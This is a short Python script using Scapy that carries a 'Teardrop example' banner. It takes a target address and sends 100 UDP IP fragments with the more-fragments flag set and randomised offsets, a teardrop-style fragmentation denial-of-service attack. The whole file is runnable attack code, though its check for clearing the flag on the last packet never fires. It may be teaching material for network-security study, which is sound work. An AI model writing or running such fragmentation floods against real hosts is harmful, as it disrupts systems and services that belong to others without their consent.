from scapy.all import *
from scapy.layers.inet import *

import random
import argparse

n_pkts = 100
payload = b"X"*1000

print()
print("        _____  ______ ___    _____ _____")
print("       / ___/ / ____//   |  / ___// ___/")
print("       \__ \ / /    / /| |  \__ \ \__ \ ")
print("      ___/ // /___ / ___ | ___/ /___/ / ")
print("     /____/ \____//_/  |_|/____//____/  ")
print("                                        ")
print("              Teardrop example          ")
print()

parser = argparse.ArgumentParser()
parser.add_argument('--target', type=str, required=True)
args = parser.parse_args()

target = args.target

print(" target: " + target)
print()

print("     packet forging")
pkt = IP(dst=target, proto=17, flags="MF", frag=0)

for i in range(0,n_pkts):
    offset = i*random.randint(200,1000)
    pkt.frag = offset
    print("     sending packet #" + str(i+1))
    if i == n_pkts:
        pkt.flags = 0
    send(pkt / payload, verbose=0)
